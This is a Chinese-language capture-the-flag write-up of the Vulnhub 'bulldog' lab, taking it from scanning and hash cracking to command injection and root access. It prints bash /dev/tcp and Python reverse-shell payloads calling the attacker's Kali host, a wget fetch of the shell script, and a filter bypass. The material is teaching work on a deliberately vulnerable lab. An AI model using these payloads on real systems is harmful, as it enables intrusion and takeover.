 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/phzqs-lnxjDdGs8bb2Wl9g)

文章目录：

*   **一. bulldog 题目描述及环境配置**
    
    **1. 题目描述**
    
    **2. 环境搭建**
    
*   **二. bulldog 靶机渗透详解**
    
    **1. 信息收集及目录扫描**
    
    **2. 源码解读及系统登陆**
    
    **3. 命令注入和 shell 反弹**
    
    **4. 权限提升和获取 flag**
    
*   **三. 总结  
    **
    

作者的 github 资源：  

*   逆向分析：https://github.com/eastmountyxz/
    
    SystemSecurity-ReverseAnalysis
    
*   网络安全：https://github.com/eastmountyxz/
    
    NetworkSecuritySelf-study
    

> 声明：本人坚决反对利用教学方法进行犯罪的行为，一切犯罪行为必将受到严惩，绿色网络需要我们共同维护，更推荐大家了解它们背后的原理，更好地进行防护。该样本不会分享给大家，分析工具会分享。

一. bulldog 题目描述及环境配置
====================

Vulnhub 是一个特别好的渗透测试实战靶场，提供了许多带有漏洞的渗透测试虚拟机下载。作者会深入分析 20 多个案例来熟悉各种 Web 渗透工具及方法，希望能帮助到您。

1. 题目描述
-------

靶场题目：bulldog

靶场地址：https://www.vulnhub.com/entry/bulldog-1%2C211/

难度描述：初学者 / 中级，目标是进入根目录并查看祝贺消息，提权到 root 权限查看 flag

靶场作者：Nick Frichette

下载地址：  
https://download.vulnhub.com/bulldog/  
https://download.vulnhub.com/bulldog/bulldog.ova

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9C140USJcApIy7xmzCrpeBfDE3Vclbywpg53NdeYWR3WaWOeYINVSqg/640?wx_fmt=png)

> Description  
> Bulldog Industries recently had its website defaced and owned by the malicious German Shepherd Hack Team. Could this mean there are more vulnerabilities to exploit? Why don’t you find out? This is a standard Boot-to-Root. Your only goal is to get into the root directory and see the congratulatory message, how you do it is up to you!  
> Difficulty: Beginner/Intermediate, if you get stuck, try to figure out all the different ways you can interact with the system. That’s my only hint  
> Made by Nick Frichette (frichetten.com) Twitter: @frichette_n  
> I’d highly recommend running this on Virtualbox, I had some issues getting it to work in VMware. Additionally DHCP is enabled so you shouldn’t have any troubles getting it onto your network. It defaults to bridged mode, but feel free to change that if you like.  

2. 环境搭建
-------

第一步，下载资源

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9IoOnDhINx96dy0Btyb2icDQt4SUbT36RYClkibicNnQWQiclT45BnfYqJg/640?wx_fmt=png)

第二步，打开 VMware 虚拟机安装靶场  
找到我们刚才下载的文件，导入虚拟机。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9Rv7OnWYJyWXv4ibCyxEJnOm9P4qv2IBDlBFicOEBesF24aria2MM5T8ug/640?wx_fmt=png)

选择存放的位置，然后点击导入。如果出现未通过 OVF 规范一致性或虚拟硬件合规性检查，请单击 “重试” 导入。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9xl9bLHQ7nYVDTuEpib0ibOvhRqw9xsH0Vs2VY59rs651YBSbxnljWcEw/640?wx_fmt=png)

第三步，导入完成之后，设置 NAT 网络模式  
注意，我们需要将靶机和 kali 放在同一个局域网下，保证能通信。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg99QvBXJHCAozOte3RzhgYhcO5ickdShxurBcWDQoTKibibduSfbNEQFicWQ/640?wx_fmt=png)

第四步，点击开启虚拟机

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9STvpQGwoXWjAyxdCicSavV5KYE7REicVYPbT6kC8N0RlLbia1aYrr7vHw/640?wx_fmt=png)

此时服务器处于开启状态，开始 Kali 操作吧！最早我一直去找用户名和密码尝试登录，后来想这个靶场应该是让你通过其他系统来渗透的。哈哈，毕竟我也是初学者，遇到任何简单问题都理解。

第五步，设置虚拟机网络  
到开机页面选择第二个 Ubuntu 的高级选项，如果启动网络正常的话可以直接开机，如果网络不正常可以按下面步骤操作。进入高级选项，再次选择第二个 Linux 内核版本的恢复模式回车。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9fBpiazuF55bia19HmtZYvpowlkvEY02THMgsu3xe6HKbxW3vVcIjB9LA/640?wx_fmt=png)

回车后会弹出选择界面，我们选择 root 一行回车，接着再次回车进入命令行模式。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9uw42n5Hh4op5Dd5EErDYHDteN6U476PQ8E2Z07akI9tHpXMBnISibAQ/640?wx_fmt=png)

输入 “mount -o rw,remount /” 命令，再配置网络问卷，否则后面可能无法保存网络配置文件，这个命令让我们的 / 路径文件系统的可读模式能自由修改。接着输入命令查看网卡。

*   mount -o rw,remount /
    
*   ifconfig -a
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9217zTOVpiaTbRWGYSMM2IOLHKmW4uT3tzV11ib737axsEqYz6ibytt21Q/640?wx_fmt=png)

作者的是 ens33，然后继续输入命令修改网络配置文件。输入 I 修改模式，如下图所示。

*   vi /etc/network/interfaces
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9jWibgTicyvPCUMn3Qf1uicuBDO4tCtlYwjoIBnGfXHA2JA906KahOlOKQ/640?wx_fmt=png)

修改这两个地方，改成你的网卡名称，然后输入 “:wq” 保存。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9pFWaEMpFXUiaKFv5ETCO8ExfOjSVjSKoxz4pesAOiamEWKI0Q4MJia12g/640?wx_fmt=png)

最后输入 reboot 重启即可。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9c7IeNuEGxnwYw1Sia5Z51r5gU4HUVicd7oAB0XBK9T2b7fw2Un4EUbKQ/640?wx_fmt=png)

二. bulldog 靶机渗透详解
=================

1. 信息收集及目录扫描
------------

首先是信息收集一波，任何网站或 Web 都需要进行一波扫描和分析。

第一步，目标主机 IP 探测  
首先需要探测目标靶场的 IP，推荐三种方法。

方法 1：使用 arp-scan 命令探测目标的 IP 地址

*   arp-scan -l
    
*   目标 IP 为 192.168.44.153
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9nJZ1EO0iaic4Elbd7VOaibSGlnP40iaYMibXkBaBObuT5ocD5yGNNz6Tbng/640?wx_fmt=png)

方法 2：使用 nmap 识别目标主机

*   nmap -sP 192.168.44.0/24
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg959bRs1crNNysWkN3RvqamaxZqUv79bHwC2JdeqIHjTHABjSnibwtgBg/640?wx_fmt=png)

方法 3：使用 netdiscover 识别目标主机

*   netdiscover -r 192.168.44.0/24 -i eth0  
    作者结合自己的虚拟机识别出来 IP 地址为：192.168.44.153
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9UNNo3Cnq6ST9vOW0ib9T4IqH0qA1OfgrJxmhxz5hW8Q6w6udMFo0Mpg/640?wx_fmt=png)

第二步，端口扫描  
nmap 命令的基本用法如下：

*   -sS：半开扫描，记入系统日志风险小
    
*   -sP：扫描端口前，先使用 ping 扫描，保证主机存活
    
*   -A：全面系统检测，启用脚本检测和扫描
    

输入命令如下：

*   nmap -sS -T4 -A -p- 192.168.44.153
    

扫描结果（主机开放端口）如下，常用的端口 23、88 和 8080，发现 SSH 服务和 Web 服务，并且 Web 服务为 python。23 端口是 telnet 的默认端口，80 端口和 8080 端口经常被用作提供 web 服务。

*   23：SSH 远程连接
    
*   80：HTTP 网站协议
    
*   8080：HTTP 网站协议
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9aQfP9fXryuCE206SRO6Qr6ujMRFHbwFWchLANUR9ibScJnhRk9HV8aw/640?wx_fmt=png)

接着我们可以借助 nc 及其他工具对每个端口进行分析。

*   nc -nv 192.168.44.153 23
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9OlqHibpSz7tDnLvUXaFaTUyYuPk2MaOz2ozmJ6daZfnRMmbKicr3rNTw/640?wx_fmt=png)

这里显示 23 是一个远程端口，运行着 openssh 服务。接着尝试在终端中输入 “ssh -v test@192.168.44.153 -p 23” 测试。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9oxkwBjta3UCA0XQ83DTLmZVibriaYX2h6jGiaWVWiaCNH8vdxG1iciaGTnPA/640?wx_fmt=png)

接着测试 80 端口和 8080 端口，运行结果如下：

*   nc -nv 192.168.44.153 80
    
*   nc -nv 192.168.44.153 8080
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9zX2TqfVYgh56rh3xLATMbJ7eHLWDg72Hp46wAPc1h0d4K23AIA3EQA/640?wx_fmt=png)

接下来使用搜索引擎搜索 “WSGIServer/0.1 Python /2.7.12“，结果显示这是一个 Django Web 服务器。

第三步，目录扫描  
在信息扫描中，目录扫描是接下来的操作，利用 dirb 扫描 80 端口的目录文件，敏感文件分析非常重要。

*   dirb http://192.168.44.153
    

使用 dirb 扫描到两个目录，但是没有任何有用信息。

*   DIRECTORY: http://192.168.44.153/admin/
    
*   DIRECTORY: http://192.168.44.153/dev/
    
*   DIRECTORY: http://192.168.44.153/admin/auth/
    
*   DIRECTORY: http://192.168.44.153/admin/login/
    
*   DIRECTORY: http://192.168.44.153/admin/logout/
    
*   DIRECTORY: http://192.168.44.153/dev/shell/
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9z2LwFTmysR1VT4mMRUddeUp5V50nOwovBhbck49icwTQFEaGoibR54icA/640?wx_fmt=png)

2. 源码解读及系统登陆
------------

第一步，敏感文件分析  
尝试用浏览器访问网址，网页中包含了一张 bulldog 图片和文字。

*   http://192.168.44.153
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9eMIuyP0BKTj98iau05oGX8PFGkuXjj6Kiaendw6VWHxIZQA3qpicrDBXg/640?wx_fmt=png)

查看源代码发现是 POST 提交请求，没有价值信息。

*   http://192.168.44.153/admin
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9K3UtHFIh5mkDicaDfoDWpWsQib49g2KCndbjWAD2ibIIPpCmsE8Z6B1vg/640?wx_fmt=png)

打开 admin 尝试人工注入失败，也可以用 Burp 注入测试下。

*   http://192.168.44.153/admin/login/?next=/admin/
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9WyNknpHUXuYCVpkuToID2s0wvtb4aiaad9khnGQedvz22wShWS2cFibw/640?wx_fmt=png)

从扫描结果中，我们得到一个很有意思的 web 目录 /dev/ ，浏览器中访问。

*   http://192.168.44.153/dev/
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9wOhTfuWVj52r2e4cxwBWibZw1u5eTk9WQkAOiacpicAQUEb8nddlT4sVA/640?wx_fmt=png)

浏览一下，发现 / dev / 页面的信息比较多，简单翻译如下。大概意思移除了 PHP、phpmyadmin 和 CMS 系统，新的系统是用 Django 编写并且启用了 SSH。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9OZx0gD7QUkNia0ffVVxY2PdqqU10TqbmOM89gNXhbMpkc2ZDCemfkvg/640?wx_fmt=png)

查看 / dev/shell 发现 Webshell 不能使用，需要通过服务器进行身份验证才能使用 Webshell。通常 Webshell 是能为我们所用的，但现在提示与服务器进行身份验证才能使用 Webshell，那接着看看源代码（之前 dirb 扫描出该目录）。

*   http://192.168.44.153/dev/shell/
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9fsbAjNDibkwibXbs4ox8OrOoTHDRhaS2mibSWibWQz4B66KIJacyEbhWAA/640?wx_fmt=png)

第二步，查看网页源代码并分析

查看 /dev/ 源代码，可以看到邮箱和一些 hash 值。

*   Team Lead: alan@bulldogindustries.com
    
    – 6515229daf8dbdc8b89fed2e60f107433da5f2cb –
    
*   Back-up Team Lead: william@bulldogindustries.com
    
    – 38882f3b81f8f2bc47d9f3119155b05f954892fb –
    
*   Front End: malik@bulldogindustries.com
    
    – c6f7e34d5d08ba4a40dd5627508ccb55b425e279 –
    
*   Front End: kevin@bulldogindustries.com
    
    – 0e6ae9fe8af1cd4192865ac97ebf6bda414218a9 –
    
*   Back End: ashley@bulldogindustries.com
    
    – 553d917a396414ab99785694afd51df3a8a8a3e0 –
    
*   Back End: nick@bulldogindustries.com
    
    – ddf45997a7e18a25ad5f5cf222da64814dd060d5 –
    
*   Database: sarah@bulldogindustries.com
    
    – d8b8dd5e7f000b8dea26ef8428caf38c04466b3e –
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9jQohhclpV9gQ7iaicUVAYasd5Cg9MVCTkgfhCVNXrqMq8DYMR0bdoLGg/640?wx_fmt=png)

方法一：在线网站爆破  
每个邮箱后都有一个哈希值，这很可能是 password，接着对每个 md5 进行在线解密。

*   https://cmd5.com/
    
*   https://www.somd5.com/
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9Cl3NSyNKjyOtdoaTLUoiaFGrrlvaTXtAjA0Cqibibql34jh7d0yeyib3tg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9YNYENHQYaU3FPPCP1ibDXG0XnP53PciaQ7BrmbPczSZJFbWgA5JYTQqg/640?wx_fmt=png)

解密出最后两条信息：

*   bulldog (Back End nick@bulldogindustries.com)
    
*   bulldoglover (Database sarah@bulldogindustries.com)
    

方法二：通过 hash-identifier 工具和 John  
爆破它们，就需要知道是哪种算法生成的这些值，我们借助一个开源的工具 “hash-identifier” 来识别哪种 hash。

*   hash-identifier
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9c60wCYuML9G8KGActk2DFn4Bpg0QlYoGAo6Mp7TVf5A121A9ibG2Q9Q/640?wx_fmt=png)

其结果是 SHA-1 哈希，接下来使用 John-The-Ripper 进行解密即可。  

接下来，我们使用用户名 nick@bulldogindustries.com 和 sarah@bulldogindustries.com 以及对应的密码 bulldog 和 bulldoglover 登陆，却失败告终。接着大胆猜测，用户名为 nick 和 sarah ，密码分别对应 bulldog 和 bulldoglover。

*   用户名：nick，密码：bulldog
    
*   用户名：sarah，密码：bulldoglover
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg98phAibA8XIicgPPfUcPupIIYRMnfuWVqQ1nJrowwXrgoSg25SY6hUSlg/640?wx_fmt=png)

成功登录系统，但提示没有对应的权限。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9Fzxxcel65fyjKBoObbthibIwzFpHc1VX2jb6bjCsJuIP2at3IdJxZFg/640?wx_fmt=png)

3. 命令注入和 shell 反弹
-----------------

第一步，访问 Webshell 的基本命令  
尝试访问 http://192.168.44.153/dev/shell，成功得到 Webshell，此时能够提交 6 个命令。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9qwU68ObOv970vNwOEv1WZcPWHx0iaWEpJcoYS9vlKzOBF2JvEAyx5AQ/640?wx_fmt=png)

这里给我们 6 个可用的命令，如下图所示，比如输入 “ifconfig” 查看网络。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9hGyP9WM9j7OlAQ0z0MXoJt0unRBIUXibZ5N7qVtxDml2OTn7GCFTpFA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9JsbSsSO2Zce07hs4pibO2Aogpkeg9ibdahS1tNg3pcCnwH6s7YDJekPw/640?wx_fmt=png)

但执行其他的命令会被拦截，因为该网站加了过滤，一些敏感命令没办法使用。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9HhKg5dN9xSGL8Vz5nJOv6sicJZJh3JfEXGef2sUwvhSVMpxkRNibnibnA/640?wx_fmt=png)

第二步，使用 Linux 的 & 和 | 进行命令组合绕过

*   ifconfig&&ls
    
*   ifconfig & whoami
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg98wrP5j3IcrZDiatwvIGcjUrxyEjicwUkVkJsTFbeK53kMJW9Oqopwm7g/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9H5ibmW5iaiajvSlyrBh2Q81tLCP1mkxzD8gUbSQCwS96vIrib89tjsj6Gg/640?wx_fmt=png)

我们需要想办法绕过防火墙取得最终权限，经过一番琢磨，用 echo 命令打包可以实现绕过，例如：echo whoami|sh。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9CIjhoEgibphFOtss0oh5Ul8H4TFbz9khmPYF5t0hBR4IRXdLBUhgsUw/640?wx_fmt=png)

第三步，nc 监听端口并反弹 shell  
本地执行 nc -lvp 4444 监听本地端口 4444，然后在 Web-shell 上执行反弹脚本。

*   nc -lvp 4444
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9Rj4ojQ75F23uicPJcLybASBvGOHp0zDj3ibsjz4jLO5vicgdPibBCrOaQw/640?wx_fmt=png)

接着尝试 bash 反弹，在靶机打开的网页命令框中输入命令，但结果提示错误。

*   bash -i >& /dev/tcp/192.168.44.138/4444 0>&1
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9FSpZohzCOYiaAT690b5zEMDKSOicibGYbgheZp1CJRlSV8VhEbtjsXRQA/640?wx_fmt=png)

由于 echo 命令是允许执行的，所以利用 echo 构建一个反弹 shell 的命令，然后用管道符给 bash 执行。

*   ls &&echo “bash -i>& /dev/tcp/192.168.44.138/4444 0>&1” | bash
    
*   echo “bash -i>& /dev/tcp/192.168.44.138/4444 0>&1” | bash
    
*   IP 地址为 Kali 攻击机地址
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9BPp9e3m8M3bhAgK6gYr9lOqXPO4I1UQn8magfIYciaTsf4yJsiaR9UIQ/640?wx_fmt=png)

在 web 页面执行 echo ‘bash -i >& /dev/tcp/192.168.44.138/4444 0>&1’|bash，就可以弹回一个 shell。注意，这里的 IP 地址是 Kali 系统的，否则会提示 “500 错误”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9H5lRJU9ibtNsEvU82eibVkia2l24DfOV3a2LoPo05dNfWNkoOXs4CfTUw/640?wx_fmt=png)

此时的 nc 处于正常监听状态，并且成功反弹 shell。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9opYOc4Q3yQDjesHBq2rIqo9icwpI4icKib2diaA4HlB60cAqwTvcaB62hQ/640?wx_fmt=png)

同时，补充另一种方法。通过 Kali 搭建一个简易 Web 服务，反弹 shell 的脚本要写到相应的目录，否则靶机用 wget 下载的时候就会访问失败。

```
import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect(("192.168.44.138", 4444))  #Kali系统IP地址 4444是nc的监听端口os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call(["/bin/bash","-i"])
```

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9Cv67HpaKWEibjrJK114ZKvbhJjbyTa4V0WKtfxOibGfLFmLgib7orxU2g/640?wx_fmt=png)

如果服务器搭建在 / var/www/html 文件时，需要把脚本写到 / var/www/html。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9EObNYPDm64VNv7yTFP5a3jnNRs0hugTeyjn2NknIBKnfSZGkXicbuyw/640?wx_fmt=png)

输入下面监听 Python 网站。

*   python -m SimpleHTTPServer 80
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9dcEKLcj2Nq6TdL6PvOD8sRIHicicjSUesZpXBNVumgJnV9bJ1pn6SYgQ/640?wx_fmt=png)

靶机用 weget 命令上传 Python 文件，并反弹 shell。

*   pwd&wget http://192.168.44.153/bulldog-webshell.py
    
*   反弹成功 输入 python -c ‘import pty;pty.spawn("/bin/bash")’
    

至此，我们得到了 django 的普通权限，下一步就是想办法提权，这就需要不断地去探索发现整个系统的漏洞。

4. 权限提升和获取 flag
---------------

nc 反弹 shell 之后，我们可以使用命令进行一系列的查看。

*   ls
    
*   cd
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9mdpVpibuFPD9EQcZWEscdPib5r0jPkDpxj8LyhF28AKQ2ibeWP2h8JTKQ/640?wx_fmt=png)

切换目录到 bulldogadmin，并查看全部文件，包括隐藏文件。

*   cd bulldogadmin
    
*   ls -al
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9tLMTVoXcSJq736DvyfkcnXEAtqmcKndeEHicSezoPXxkROXOvibObhbg/640?wx_fmt=png)

这里发现一个. hiddenadmindirectory 文件，进入隐藏管理员目录查看。看到 customPermissionApp，它应该是分配权限的一个程序，但我们没有权限打开。接着怎么办呢？虽然不能执行，但是尝试查看文件的内容和字符串。

*   cd .hiddenadmindirectory
    
*   ls -al
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9xOemUN6Sp4dPLmtOEia6N5Ctw2ryicLeI4SQ7UTwnFttbMQQhskayCMw/640?wx_fmt=png)

利用 string 查看可执行文件中的字符。

*   strings customPerssionApp
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9ibibfb5737ia6rzaFUyuYnDB4crDUUpXWTgAEOCBSwAk3sQCYW9jmRkGA/640?wx_fmt=png)

从以上字符猜测该程序的用途，推测其是密码。通过下列四个字符拼接，注意每一段后面的 H 不是密码需要去除。

```
SUPERultH
imatePASH
SWORDyouH
CANTget
```

*   密码：SUPERultimatePASSWORDyouCANTget
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg95nsv7ZIdJC3Rm4kKf7Qff7rkgVmW7oAlF6lIRLAmJLTAyFWxtuorpg/640?wx_fmt=png)

接着想办法用上面的密码提升 django 或者 bulldogadmin 权限，我们想通过 sudo su - root 拿到 root，但提示 “su must be run from a terminal”。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9zF2A3WEalLwMCS3L9SHricAd4TEQgN64nZFsF4o8y8Jbibb7NrXUP0MQ/640?wx_fmt=png)

这里补充一个技巧，可以用 Python 调用本地的 shell 实现，命令如下：

*   python -c 'import pty; pty.spawn("/bin/bash")'
    

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9Xg49oeSRU87uDCGYVRkQWzP0GuPPmTIgGWzsfpbmegjNA3X9g8SVLg/640?wx_fmt=png)

然后执行命令 sudo su -，输入刚才记下来的密码，成功从 django 权限提升到 root 权限，最终成功获得 root 权限并拿到 flag。

*   sudo su -
    
*   密码：SUPERultimatePASSWORDyouCANTget
    

输入 ls 命令，发现里面只有一个文本文档，再输入 cat congrats.txt 查看文件，最后读取 flag 文件。

![](https://mmbiz.qpic.cn/mmbiz_png/0RFmxdZEDROZcQQokCoHhOSZvZceozg9xQ43BzMH9hr9vibn6ZuQwEyCy5HDEA0SiaCBUcuMuONmno3XyomfmGZg/640?wx_fmt=png)

三. 总结
=====

写道这里，这篇文章讲解完毕，后续会更深入的分享。bulldog 的渗透流程如下：

*   信息收集  
    目标 IP 探测 (arp-scan、netdiscover、nmap)  
    Nmap 端口扫描
    
*   目录扫描  
    用 dirb 扫出了许多关键目录（admin 和 dev 页面）
    
*   敏感文件查找及网页访问
    
*   MD5 破解（在线破解、hash-identifier）  
    仔细观察网页信息，该靶机主要在 / dev 目录处前端源码泄露了 MD5 密码信息
    
*   登录管理员账号，并在 / dev/shell 页面利用命令注入漏洞
    
*   命令注入和 shell 反弹  
    命令拼接（ls &&echo “bash -i>&
    
    /dev/tcp/192.168.44.138/4444 0>&1” | bash）  
    nc 反弹 shell（nc -lvp 4444）  
    Python 搭建临时 Web 服务（python -m SimpleHTTPServer 80）
    
*   权限提升和获取 flag  
    sudo python -c ‘import pty; pty.spawn("/bin/bash")’  
    sudo su - root
    





参考文献：

*   [1] https://www.vulnhub.com/entry/bulldog-1%2C211/  
    
*   [2] Bulldog: 1 – Vulnhub Writeup - vonhewitt
    
*   [3] Vulnhub 靶场渗透练习 (三) bulldog - feizianquan
    
*   [4] VulnHub 靶机学习——BullDog 实战记录 - 安全师官方
    
*   [5] WriteUp|CTF-bulldog - cnsimo
    
*   [6] Vulnhub bulldog 靶机渗透 - A1oe
    
*   [7] VulnHub------bulldog - 大方子
    
*   [8] [VulnHub 靶机渗透] 一：BullDog2 - 工科学生死板板